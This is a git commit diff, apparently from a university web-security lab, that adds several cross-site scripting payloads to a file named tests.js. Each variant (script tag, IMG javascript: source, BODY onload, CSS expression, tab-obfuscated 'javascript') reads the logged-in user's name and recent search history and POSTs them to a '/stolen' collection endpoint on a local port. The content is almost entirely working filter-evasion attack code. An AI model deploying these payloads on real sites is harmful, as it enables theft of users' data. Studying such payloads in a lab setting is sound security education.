6b4d429fc1bafc4880da0c7d6801d840c63f9262
Nicl7004 <nicholas.clement@colorado.edu>
2017-02-20 23:21:25 -0700

    update from this evening

--- lab2-web/tests.js
+++ lab2-web/tests.js
@@ -40,4 +40,20 @@ xhr.setRequestHeader('Content-Type', '');xhr.send(JSON.stringify({value: value})
 // }
 window.location.href=send;
 
+ORIG:
 <script>window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}</script>
+
+
+
+<!---->window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}<!---->
+
+<IMG SRC="(javascript:window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send())}">
+
+
+<BODY ONLOAD=(window.onload = function() {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()})>
+
+
+<DIV STYLE="width: expression(var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send())">
+
+
+<IMG SRC="jav&#x09;ascript:window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()};">
